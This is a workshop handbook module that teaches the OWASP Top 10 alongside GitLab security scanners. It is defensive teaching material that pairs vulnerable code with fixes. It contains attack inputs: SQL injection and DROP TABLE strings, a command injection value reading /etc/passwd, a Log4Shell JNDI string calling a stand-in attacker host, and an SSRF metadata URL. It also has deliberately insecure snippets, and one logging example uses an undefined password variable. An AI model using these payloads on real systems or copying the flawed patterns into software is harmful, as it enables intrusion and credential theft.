# STUDENT HANDBOOK — MODULE 8
## OWASP Top 10: Understanding the Vulnerabilities You Are Scanning For

---

**Workshop:** GitLab Ultimate for Secure SDLC, DevSecOps, AI, Robotics & IoT
**Day:** 2 of 2 | **Module:** 8 of 16 | **Duration:** 90 minutes

---

## Learning Objectives

- Describe each OWASP Top 10 category with a concrete attack scenario
- Identify the GitLab scanner(s) that detect each category
- Recognise vulnerable code patterns for the most critical categories
- Apply prevention strategies for each category
- Use the mapping table to plan scanner coverage for your application

---

## Why the OWASP Top 10 Matters

The OWASP Top 10 is not a complete list of every vulnerability. It is a list of the **most common and impactful** vulnerability classes — derived from data collected from thousands of real organisations.

> Understanding *what* you are scanning for is as important as understanding *how* to scan. A developer who recognises SQL injection writes secure code. A developer who treats SAST findings as mysterious warnings dismisses them.

**Reference:** https://owasp.org/www-project-top-ten/

---

## A01: Broken Access Control

### What It Is
Access controls that restrict what authenticated users can do are not properly enforced.

### Attack Pattern — IDOR
```
Normal request:  GET /api/orders/12345  → Returns YOUR order
Attack:          GET /api/orders/12346  → Returns SOMEONE ELSE's order
                                          (if server only checks auth, not ownership)
```

### Vulnerable Code (Python Flask)
```python
# ❌ Vulnerable: only checks authentication, not ownership
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)  # No ownership check!
    return jsonify(order.to_dict())
```

### Secure Code
```python
# ✅ Secure: verifies the requesting user owns this order
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id  # Ownership verified
    ).first_or_404()
    return jsonify(order.to_dict())
```

### GitLab Detection
- **SAST**: Detects direct object lookups without ownership check
- **DAST**: Tests endpoint access with different user sessions, manipulated parameters
- **Code Review**: Manual review via MR is the primary gate for business logic access control

---

## A02: Cryptographic Failures

### What It Is
Sensitive data exposed due to weak/absent cryptography: weak hash algorithms, unencrypted transmission, hardcoded keys, disabled TLS validation.

### Vulnerable Code
```python
# ❌ MD5 for passwords — trivially crackable
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# ❌ Disabled TLS certificate verification
import requests
response = requests.get(url, verify=False)

# ❌ Hardcoded encryption key
SECRET_KEY = "my-super-secret-key-123"  # In source code = exposed
```

### Secure Code
```python
# ✅ bcrypt for passwords — designed for password hashing
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# ✅ Always verify TLS certificates (default)
response = requests.get(url)  # verify=True is default

# ✅ Key from environment variable (stored in GitLab CI Variable, masked)
import os
SECRET_KEY = os.environ['SECRET_KEY']  # Never hardcode
```

### GitLab Detection
- **SAST (Semgrep)**: `hashlib.md5/sha1` for passwords, `verify=False`, hardcoded keys
- **Secret Detection (Gitleaks)**: Private keys, certificates, API tokens in code

---

## A03: Injection

### What It Is
Hostile data sent to an interpreter as part of a command or query. SQL injection is the most common; command injection is the most dangerous.

### SQL Injection
```python
# ❌ String concatenation — classic SQL injection
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    db.execute(query)
    # Attack: username = "admin' OR '1'='1" → returns ALL users
    # Attack: username = "'; DROP TABLE users; --" → destroys table

# ✅ Parameterised query — SQL injection impossible
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    db.execute(query, (username,))
    # User input is treated as DATA, never as SQL syntax
```

### Command Injection
```python
# ❌ shell=True with user input — arbitrary command execution
import subprocess
def ping_host(hostname):
    subprocess.run(f"ping -c 1 {hostname}", shell=True)
    # Attack: hostname = "google.com; cat /etc/passwd"

# ✅ List argument — shell never invoked
def ping_host(hostname):
    # Validate hostname first!
    if not hostname.replace('.', '').replace('-', '').isalnum():
        raise ValueError("Invalid hostname")
    subprocess.run(["ping", "-c", "1", hostname])  # No shell
```

### GitLab Detection
- **SAST**: String concatenation in DB queries, `shell=True` with user input, `eval()`
- **DAST**: Automated injection payloads against all API parameters

---

## A04: Insecure Design

### What It Is
Security flaws baked into the design — not implementation bugs. No amount of scanning fixes a design that never had security requirements.

### Common Design Failures
| Design Flaw | Consequence |
|---|---|
| No rate limiting on login | Brute force / credential stuffing |
| Security questions for password reset | Bypassable by public information |
| No CSRF protection on state-changing actions | Cross-site request forgery |
| OTA update without signature verification | Attacker can push malicious firmware |
| Admin functions accessible to all authenticated users | Privilege escalation |

### GitLab Integration
SAST can detect some insecure design patterns (missing rate limiting decorators, missing CSRF checks), but the primary gate is **design-phase review** and **MR code review with CODEOWNERS**.

Use an MR template with a security design checklist:
```markdown
## Security Design Checklist
- [ ] Authentication required on all sensitive endpoints
- [ ] Rate limiting applied to authentication endpoints
- [ ] User input validated and sanitised
- [ ] No sensitive operations without CSRF protection
- [ ] All user data access validates ownership
- [ ] OTA/update mechanisms verify signatures
```

---

## A05: Security Misconfiguration

### What It Is
Default configs, incomplete configs, cloud storage misconfigs, debug mode in production, verbose errors.

### Terraform Misconfiguration (IaC)
```hcl
# ❌ Public S3 bucket — GitLab IaC Scan (KICS) will flag this
resource "aws_s3_bucket_acl" "data" {
  acl = "public-read"           # Critical: publicly accessible
}

resource "aws_security_group_rule" "open" {
  cidr_blocks = ["0.0.0.0/0"]  # Critical: open to internet
  from_port   = 22              # Critical: SSH open globally
}
```

```hcl
# ✅ Private S3 with encryption
resource "aws_s3_bucket_acl" "data" {
  acl = "private"
}
resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}
```

### Dockerfile Misconfiguration
```dockerfile
# ❌ Running as root — Container Scanning will flag
FROM ubuntu:20.04
COPY app /app
CMD ["python", "app.py"]        # Runs as root by default

# ✅ Non-root user
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
RUN adduser --disabled-password appuser
USER appuser                    # Never root in production
CMD ["python", "app.py"]
```

### GitLab Detection
- **IaC Scanning (KICS)**: Terraform, CloudFormation, Kubernetes manifest misconfigs
- **Container Scanning (Trivy)**: Running as root, missing HEALTHCHECK, outdated base OS
- **SAST**: `DEBUG=True`, verbose error handlers, unsafe defaults

---

## A06: Vulnerable and Outdated Components

### What It Is
Using libraries or frameworks with known CVEs. The most directly detectable category.

### The Log4Shell Case (CVE-2021-44228, CVSS 10.0)
```
Discovery:     December 9, 2021
Severity:      CVSS 10.0 (maximum)
Affected:      Log4j 2.0-beta9 through 2.14.1
Attack:        Any logged string containing ${jndi:ldap://attacker.com/exploit}
               triggers remote class loading → Remote Code Execution
Exploitation:  Weaponised within 12 hours; 40,000+ attacks/hour within 72 hours
Impact:        Nearly every Java application using Log4j

With SCA in pipeline:
    Next pipeline run after disclosure → Dependency scan flags Log4j 2.x
    Developer sees: "log4j-core:2.14.1 — CVE-2021-44228 — CVSS 10.0 — UPDATE TO 2.17.1"
    Fix time: update version in pom.xml, redeploy

Without SCA:
    Manual audit of all Java applications across organisation
    Duration: days to weeks
    Some applications missed entirely
```

### GitLab Detection
```yaml
# Add to .gitlab-ci.yml — scans requirements.txt, package.json, pom.xml etc.
include:
  - template: Jobs/Dependency-Scanning.gitlab-ci.yml
```
- **Dependency Scanning (Trivy/Gemnasium)**: Matches dependency versions against CVE databases
- **Container Scanning (Trivy)**: OS package CVEs in Docker image

---

## A07: Identification and Authentication Failures

### What It Is
Weaknesses in authentication: no brute-force protection, weak password storage, poor session management.

### Vulnerable Patterns
```python
# ❌ No rate limiting — brute force trivially possible
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    user = User.query.filter_by(username=username).first()
    if user and user.password == password:  # Also: plaintext comparison!
        session['user_id'] = user.id
        return jsonify({'status': 'ok'})

# ✅ Rate limiting + bcrypt
from flask_limiter import Limiter
limiter = Limiter(app)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Rate limit
def login():
    username = request.json['username']
    password = request.json['password']
    user = User.query.filter_by(username=username).first()
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        session['user_id'] = user.id
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'Invalid credentials'}), 401
```

### GitLab Detection
- **SAST**: Missing rate limiting, plaintext password comparison, weak hashing
- **Secret Detection**: Hardcoded default credentials
- **DAST**: Automated brute-force simulation, session analysis

---

## A08: Software and Data Integrity Failures

### What It Is
Failures to protect against: unsafe deserialization, unsigned software updates, compromised dependencies, CI/CD pipeline compromise.

### Unsafe Deserialization
```python
# ❌ NEVER deserialize untrusted data with pickle
import pickle
data = request.get_data()
obj = pickle.loads(data)  # CRITICAL: arbitrary code execution
                           # Attacker controls obj.__reduce__()

# ✅ Use safe data formats for untrusted input
import json
data = request.get_json()  # JSON has no code execution capability
```

### The SolarWinds Pattern for Your Pipeline
| Risk | Mitigation |
|---|---|
| Malicious dependency injected | Pin dependency hashes; verify signatures |
| CI/CD pipeline compromised | Protected Runners; separate runner for security jobs |
| Build artifact tampered | Sign artifacts; verify signatures at deploy time |
| Malicious base Docker image | Use trusted registries; Container Scanning |

---

## A09: Security Logging and Monitoring Failures

### What It Is
No logging of security events → breaches go undetected for months.

### What to Log
```python
# ✅ Log authentication events
import logging
security_logger = logging.getLogger('security')

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.json.get('username', '')
    
    user = User.query.filter_by(username=username).first()
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        security_logger.info(f"LOGIN_SUCCESS user={username} ip={request.remote_addr}")
        return jsonify({'status': 'ok'})
    else:
        # ✅ Log failures — detect brute force
        security_logger.warning(f"LOGIN_FAILURE user={username} ip={request.remote_addr}")
        return jsonify({'error': 'Invalid credentials'}), 401
```

### What NOT to Log
```python
# ❌ Never log passwords — even failed attempts
security_logger.warning(f"Failed login: {username}, attempted password: {password}")
#                                                                          ^^^^^^^^
#                                                           Passwords in logs = exposure

# ❌ Never log full credit card numbers, SSNs, tokens
```

---

## A10: Server-Side Request Forgery (SSRF)

### What It Is
Attacker causes server to fetch a URL they specify — potentially reaching internal services.

### Attack Pattern
```
Cloud metadata attack:
  Attacker input:   url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  Server fetches:   AWS IAM credentials (only accessible from inside EC2)
  Attacker receives: AccessKeyId, SecretAccessKey, Token
  Impact:           Full AWS API access with the application's IAM role
```

### Vulnerable Code
```python
# ❌ Unvalidated URL fetch — SSRF
@app.route('/api/preview')
def preview_url():
    url = request.args.get('url')
    response = requests.get(url)  # Fetches any URL including internal
    return response.text

# ✅ URL validation with allowlist
import ipaddress
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'https'}
BLOCKED_PRIVATE_RANGES = [
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (AWS metadata)
    ipaddress.ip_network('10.0.0.0/8'),      # Private
    ipaddress.ip_network('172.16.0.0/12'),   # Private
    ipaddress.ip_network('192.168.0.0/16'),  # Private
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        return not any(ip in network for network in BLOCKED_PRIVATE_RANGES)
    except ValueError:
        return True  # Hostname (not IP) — DNS resolution handled elsewhere

@app.route('/api/preview')
def preview_url():
    url = request.args.get('url')
    if not is_safe_url(url):
        return jsonify({'error': 'URL not permitted'}), 403
    response = requests.get(url, allow_redirects=False)  # No redirects
    return response.text
```

---

## Quick Reference — OWASP Top 10 + GitLab Scanner

| Category | Primary Scanner | Secondary | GitLab Template |
|---|---|---|---|
| A01 Broken Access Control | DAST | SAST, Code Review | `Jobs/DAST.gitlab-ci.yml` |
| A02 Cryptographic Failures | SAST | Secret Detection | `Jobs/SAST.gitlab-ci.yml` |
| A03 Injection | SAST | DAST | `Jobs/SAST.gitlab-ci.yml` |
| A04 Insecure Design | Code Review | SAST (limited) | MR Template + CODEOWNERS |
| A05 Security Misconfiguration | IaC Scanning | Container Scan, SAST | `Jobs/IaC-Scanning.gitlab-ci.yml` |
| A06 Vulnerable Components | Dependency Scanning | Container Scan | `Jobs/Dependency-Scanning.gitlab-ci.yml` |
| A07 Auth Failures | SAST | Secret Detection, DAST | `Jobs/SAST.gitlab-ci.yml` |
| A08 Integrity Failures | SAST | Dependency Scanning | `Jobs/SAST.gitlab-ci.yml` |
| A09 Logging Failures | SAST | Code Review | `Jobs/SAST.gitlab-ci.yml` |
| A10 SSRF | SAST | DAST | `Jobs/SAST.gitlab-ci.yml` |

> Full mapping table: `09_Mapping_Tables/OWASP_Top10_to_GitLab_Mapping.md`

---

## References

1. OWASP Top 10 (2021) — https://owasp.org/www-project-top-ten/
2. GitLab Application Security — https://docs.gitlab.com/ee/user/application_security/
3. GitLab Dependency Scanning — https://docs.gitlab.com/ee/user/application_security/dependency_scanning/
4. GitLab SAST — https://docs.gitlab.com/ee/user/application_security/sast/
5. GitLab DAST — https://docs.gitlab.com/ee/user/application_security/dast/
6. GitLab IaC Scanning — https://docs.gitlab.com/ee/user/application_security/iac_scanning/
7. Log4Shell CVE-2021-44228 — https://nvd.nist.gov/vuln/detail/CVE-2021-44228
